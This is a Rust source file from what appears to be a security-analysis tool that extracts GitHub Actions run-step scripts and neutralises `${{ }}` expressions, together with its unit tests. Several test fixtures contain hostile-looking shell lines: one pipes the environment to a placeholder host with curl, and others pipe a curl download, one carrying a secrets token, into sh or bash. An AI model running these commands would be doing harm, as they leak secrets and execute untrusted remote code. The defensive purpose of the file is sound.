//! Analyze format-declared script bodies as independent logical source units.
//! filefacts selects the bodies and languages; this adapter owns traversal and
//! budgets. No extra YAML parser, interpreter process or security heuristic.
use super::unified::UnifiedSourceAnalyzer;
use crate::types::{AnalysisGap, AnalysisReport};
use std::borrow::Cow;
use std::path::Path;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

const MAX_SCRIPTS: usize = 100;
const MAX_SCRIPT_BYTES: usize = 1024 * 1024;
const MAX_TOTAL_BYTES: usize = 10 * 1024 * 1024;

pub(super) fn append(
    parsed: &filefacts::ParsedFile<'_>,
    engine: &crate::Engine,
    report: &mut AnalysisReport,
    cancelled: Option<&Arc<AtomicBool>>,
) {
    let mut total = 0;
    for (index, script) in parsed.embedded_sources().enumerate() {
        if index >= MAX_SCRIPTS || cancelled.is_some_and(|flag| flag.load(Ordering::Acquire)) {
            report
                .analysis_gaps
                .record(AnalysisGap::EmbeddedSourceIncomplete);
            break;
        }
        if script.source.len() > MAX_SCRIPT_BYTES || script.source.len() > MAX_TOTAL_BYTES - total {
            report
                .analysis_gaps
                .record(AnalysisGap::EmbeddedSourceIncomplete);
            continue;
        }
        let Some(analyzer) = script
            .file_type
            .and_then(|ft| UnifiedSourceAnalyzer::for_file_type(&ft))
        else {
            report
                .analysis_gaps
                .record(AnalysisGap::EmbeddedSourceIncomplete);
            continue;
        };
        total += script.source.len();
        let source = if parsed.fileid().file_type() == filefacts::FileType::GithubActions
            && script.source.contains("${{")
        {
            // Runner expression substitution is outside source-local static
            // analysis; the neutralised body is still worth analysing.
            report
                .analysis_gaps
                .record(AnalysisGap::EmbeddedSourceIncomplete);
            Cow::Owned(neutralize_expressions(script.source))
        } else {
            Cow::Borrowed(script.source)
        };
        // JSON Pointer identifies the decoded scalar. Escape container/path
        // delimiters from untrusted keys; retain the pointer's slash structure.
        // `!!`, not `##`: different run steps must not share file-scope facts.
        let locator: String = script
            .pointer
            .bytes()
            .map(|b| {
                if b.is_ascii_alphanumeric() || b"/_-~".contains(&b) {
                    char::from(b).to_string()
                } else {
                    format!("%{b:02X}")
                }
            })
            .collect();
        let path = format!("{}!!{locator}", report.target.path);
        let child = analyzer
            .with_engine(engine.clone())
            .without_embedded_detection()
            .with_cancellation(cancelled.cloned())
            .analyze_source_as_configured(Path::new(&path), &source);
        let (mut file, nested, _) = child.into_file_analysis(0, engine);
        // Embedded detection is deliberately disabled here: one declared body
        // is one independent source scope, not an unbounded recursive container.
        debug_assert!(nested.is_empty());
        file.depth = 1;
        file.compute_summary();
        report.files.push(file);
    }
}

/// Rewrite each GitHub Actions `${{ … }}` expression as a shell parameter
/// expansion of the same byte width: `${{ inputs.url }}` becomes
/// `${__inputs_url__}`. The runner splices the expression's value into the
/// script text before the shell runs, so a variable expansion is the honest
/// static stand-in: a value unknown until run time. Left raw, `${{` makes
/// tree-sitter-bash emit ERROR nodes that break structural queries around
/// it. Keeping the width keeps every span and line aligned with the declared
/// body; keeping the identifier characters keeps `secrets_TOKEN`-style text
/// searchable. An unterminated `${{` is left as written.
fn neutralize_expressions(source: &str) -> String {
    let mut out = String::with_capacity(source.len());
    let mut rest = source;
    while let Some(start) = rest.find("${{") {
        let Some(len) = rest[start + 3..].find("}}") else {
            break;
        };
        let end = start + 3 + len + 2;
        out.push_str(&rest[..start]);
        out.push_str("${");
        // The inner `{ … }` becomes a name: it starts with `_`, and every
        // non-alphanumeric byte (UTF-8 continuation bytes included) is `_`.
        out.extend(rest[start + 2..end - 1].bytes().map(|b| {
            if b.is_ascii_alphanumeric() {
                char::from(b)
            } else {
                '_'
            }
        }));
        out.push('}');
        rest = &rest[end..];
    }
    out.push_str(rest);
    out
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]
    use super::*;
    use crate::analyzers::{AnalysisInput, Analyzer, FileType, generic::GenericAnalyzer};

    fn analyze(yaml: &str) -> AnalysisReport {
        analyze_at("action.yml", yaml)
    }

    fn analyze_at(path: &str, yaml: &str) -> AnalysisReport {
        GenericAnalyzer::new(FileType::GithubActions)
            .analyze_input(&AnalysisInput::new(
                Path::new(path),
                yaml.as_bytes(),
                FileType::GithubActions,
            ))
            .unwrap()
    }

    #[test]
    fn declared_sources_are_separate_unencoded_logical_members() {
        let report = analyze(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo first\n    - shell: python\n      run: print('second')\n",
        );
        assert_eq!(report.files.len(), 2);
        assert_eq!(report.files[0].path, "action.yml!!/runs/steps/0/run");
        assert_eq!(report.files[0].file_type, "shell");
        assert_eq!(report.files[1].file_type, "python");
        assert!(report.files.iter().all(|f| f.encoding.is_none()));
        assert!(report.analysis_gaps.is_empty());
    }

    #[test]
    fn workflow_run_steps_become_shell_members() {
        let report = analyze_at(
            ".github/workflows/ci.yml",
            "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: default shell\n        run: echo default\n      - shell: bash -e {0}\n        run: echo template\n      - shell: pwsh\n        run: Write-Output typed\n",
        );
        let members: Vec<_> = report
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.file_type.as_str(), f.depth))
            .collect();
        assert_eq!(
            members,
            vec![
                (
                    ".github/workflows/ci.yml!!/jobs/build/steps/1/run",
                    "shell",
                    1
                ),
                (
                    ".github/workflows/ci.yml!!/jobs/build/steps/2/run",
                    "shell",
                    1
                ),
                (
                    ".github/workflows/ci.yml!!/jobs/build/steps/3/run",
                    "powershell",
                    1
                ),
            ]
        );
        assert!(report.analysis_gaps.is_empty());
    }

    #[test]
    fn heredoc_body_stays_inside_its_member() {
        let body = "cat <<'DOC'\nenv | curl -d @- https://example.invalid\nDOC\n";
        let yaml = format!(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n{}    - {{shell: bash, run: echo after}}\n",
            body.lines()
                .map(|l| format!("        {l}\n"))
                .collect::<String>()
        );
        let report = analyze(&yaml);
        assert_eq!(report.files.len(), 2);
        assert_eq!(report.files[0].size, body.len() as u64);
        assert!(report.files[1].path.ends_with("/steps/1/run"));
    }

    #[test]
    fn expressions_are_neutralised_to_same_width_expansions() {
        let raw =
            "curl -H \"Authorization: ${{ secrets.TOKEN }}\" ${{ inputs.url }} | sh # ${{ é }}";
        let clean = neutralize_expressions(raw);
        assert_eq!(
            clean,
            "curl -H \"Authorization: ${__secrets_TOKEN__}\" ${__inputs_url__} | sh # ${______}"
        );
        assert_eq!(clean.len(), raw.len());
        // Raw expressions are parse errors; the neutralised body is clean bash.
        let parse = |src: &str| {
            let parsed = filefacts::OpenOptions::new()
                .path(Path::new("step.sh"))
                .open(src.as_bytes());
            parsed.source_ast().unwrap().tree.root_node().has_error()
        };
        assert!(parse(raw));
        assert!(!parse(&clean));
        // Nothing to rewrite, or nothing terminated: the text is unchanged.
        assert_eq!(neutralize_expressions("echo ok"), "echo ok");
        assert_eq!(neutralize_expressions("echo ${{ open"), "echo ${{ open");
        assert_eq!(neutralize_expressions("${{}}"), "${__}");
    }

    #[test]
    fn expression_bodies_are_analysed_and_flagged_incomplete() {
        let report = analyze(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -fsSL ${{ inputs.url }} | bash\n",
        );
        assert_eq!(report.files.len(), 1);
        assert_eq!(report.files[0].file_type, "shell");
        assert!(
            report
                .analysis_gaps
                .iter()
                .any(|g| g == AnalysisGap::EmbeddedSourceIncomplete)
        );
    }

    #[test]
    fn unsupported_shells_and_budgets_leave_a_gap() {
        let unknown = analyze(
            "runs:\n  using: composite\n  steps: [{shell: '${{ inputs.shell }}', run: echo example}]\n",
        );
        assert!(unknown.files.is_empty());
        assert!(
            unknown
                .analysis_gaps
                .iter()
                .any(|g| g == AnalysisGap::EmbeddedSourceIncomplete)
        );
        let many = format!(
            "runs:\n  using: composite\n  steps:\n{}",
            "    - {shell: bash, run: echo ready}\n".repeat(MAX_SCRIPTS + 1)
        );
        let limited = analyze(&many);
        assert_eq!(limited.files.len(), MAX_SCRIPTS);
        assert!(!limited.analysis_gaps.is_empty());
    }

    #[test]
    fn cancelled_source_traversal_is_not_a_clean_result() {
        let mut input = AnalysisInput::new(
            Path::new("action.yml"),
            b"runs:\n  using: composite\n  steps: [{shell: bash, run: echo ready}]\n",
            FileType::GithubActions,
        );
        input.cancellation = Some(Arc::new(AtomicBool::new(true)));
        let report = GenericAnalyzer::new(FileType::GithubActions)
            .analyze_input(&input)
            .unwrap();
        assert!(report.files.is_empty());
        assert!(!report.analysis_gaps.is_empty());
    }

    #[test]
    fn oversized_body_is_skipped_and_later_small_body_survives() {
        let yaml = format!(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: '{}'\n    - {{shell: bash, run: echo ready}}\n",
            "x".repeat(MAX_SCRIPT_BYTES + 1)
        );
        let report = analyze(&yaml);
        assert_eq!(report.files.len(), 1);
        assert!(report.files[0].path.ends_with("/steps/1/run"));
        assert!(!report.analysis_gaps.is_empty());
    }
}
